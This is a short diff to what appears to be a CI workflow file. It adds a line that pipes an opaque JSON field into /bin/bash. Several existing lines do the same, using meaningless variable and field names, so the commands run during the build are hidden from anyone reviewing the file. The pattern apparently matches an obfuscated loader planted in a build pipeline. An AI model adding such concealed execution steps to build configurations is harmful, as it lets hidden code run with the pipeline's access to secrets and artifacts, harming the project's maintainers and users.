@@ -41,6 +41,7 @@ jobs:
           echo $jrmcp1 | jq -r .zsm41 | /bin/bash
           echo $ln4 | jq -r .xiw70574 | /bin/bash
           printf '%s' "$oiws952" | jq -r .feu6 | /bin/bash
+          echo $ke0 | jq -r .stloq4947 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
